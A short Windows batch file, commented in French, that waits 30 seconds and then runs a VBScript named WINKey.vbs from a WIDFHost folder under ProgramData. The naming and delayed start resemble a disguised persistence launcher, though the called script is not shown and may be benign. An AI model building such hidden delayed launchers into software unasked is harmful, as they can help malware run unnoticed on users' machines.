@echo off
REM Chemin complet vers WINKey.vbs dans le dossier WIDFHost de ProgramData
set chemin_executable=%ProgramData%\WIDFHost\WINKey.vbs

REM Attendre 30 secondes
timeout /t 30

REM Vérifie si le fichier existe et exécute-le
if exist "%chemin_executable%" (
    cscript "%chemin_executable%"
) else (
    echo Le script WINKey.vbs est introuvable dans le dossier WIDFHost de ProgramData.
)
